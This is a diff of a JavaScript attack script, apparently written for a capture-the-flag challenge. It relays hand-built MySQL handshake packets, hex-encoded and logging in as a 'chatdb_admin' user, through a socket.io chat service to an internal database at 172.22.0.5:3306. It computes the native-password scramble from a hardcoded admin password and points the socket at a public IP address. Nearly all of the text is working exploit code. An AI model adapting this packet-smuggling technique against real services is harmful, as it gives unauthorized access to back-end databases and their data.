@@ -36,15 +36,13 @@ function addScript(cdnurl){
 
 async function digestMessage(message) {
   const msgUint8 = Latin1ToUint8Array(message);                           
-  const hashBuffer = await crypto.subtle.digest('SHA-1', msgUint8);           
+  const hashBuffer = await Crypto.SHA1(msgUint8, {asBytes: true});
   const hashArray = Array.from(new Uint8Array(hashBuffer));                     
   const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join(''); 
   return hashHex;
 }
 
-async function step2(serverSeed){
-	sha1 = CryptoJS.SHA1;
-		
+async function step2(serverSeed){		
 	//// mysql native password hashing process
 	// SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
 	console.log("[+] seed "+btoa(serverSeed));
@@ -69,9 +67,9 @@ async function step2(serverSeed){
 
 var round = 0;
 
-var sock = io.connect('ws://127.0.0.1:9090/');
+var sock = io.connect(`ws://52.78.132.206:9090/`);
 sock.on('connect', function(){
-	var data = {'channel':uuid, 'userid':userid, 'chatserver': 'arang.kr:3306'};
+	var data = {'channel':uuid, 'userid':userid, 'chatserver': '172.22.0.5:3306'};
 	sock.emit("join",data);
 });
 
@@ -84,7 +82,7 @@ sock.on('join', function(data){
 
 // when get a new chat message
 sock.on('newchat', function(data){
-	console.log(data.msg);
+	//console.log(data.msg);
 	//var result = ab2str(data.msg);
 	var result = data.msg;
 	console.log("[+] newchat "+result);
@@ -98,14 +96,11 @@ sock.on('newchat', function(data){
 
 
 var password = "th1s_1s_ch4tdb_4dm1n_p4ssw0rd";
-addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js");
-addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js");
+addScript("https://arang.kr/sha1.js");
 var packet = "";
 
 // step 1
-//p1 = convertFromHex("c30000018da2bf0900000001ff00000000000000000000000000000000000000000000006172616e67330000746573740063616368696e675f736861325f70617373776f72640074045f706964053238373139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
-
-p1 = convertFromHex("c80000018da2bf0900000001ff00000000000000000000000000000000000000000000006172616e677465737400006368617464620063616368696e675f736861325f70617373776f72640074045f706964053239333632095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
+p1 = convertFromHex("cb0000018da2bf0900000001ff00000000000000000000000000000000000000000000006368617464625f61646d696e00006368617464620063616368696e675f736861325f70617373776f72640074045f706964053136343139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
 
 setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
 setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
